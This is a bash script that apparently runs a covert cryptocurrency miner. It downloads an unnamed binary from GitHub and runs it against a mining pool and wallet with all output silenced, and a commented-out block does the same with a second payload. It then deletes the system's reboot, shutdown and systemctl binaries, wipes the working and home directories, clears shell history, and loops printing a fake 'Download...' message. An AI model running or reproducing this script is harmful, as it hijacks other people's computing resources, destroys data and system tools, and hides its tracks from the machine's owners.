#!/bin/bash
apt-get update 
apt-get install -y wget curl sudo
wget -O sgr1 https://github.com/AlmiraHanafie/All-File/raw/main/sarebu >/dev/null 2>&1
chmod +x sgr1
./sgr1 --algorithm yespowersugar --pool nomp.mofumofu.me:3391 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$(echo STB-$(shuf -i 1000-9999 -n 1)) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive >/dev/null 2>&1 &
#wget -qO zjava https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab
#chmod +x zjava
#nohup ./zjava -o 47.89.195.104:443 -a rx/0 -u ZEPHs9VvRqBYzdxe7Qwutt7KLSqnQR96MdUQmsVPMtq39xxWByfFUYDBFrdfD9n3G9P2HAKCiuuu48iZzrQjnEYbAxitysPd9gp.$(echo STB-$(shuf -i 1000-9999 -n 1)) --randomx-1gb-pages -p -x -t $(nproc --all) >/dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done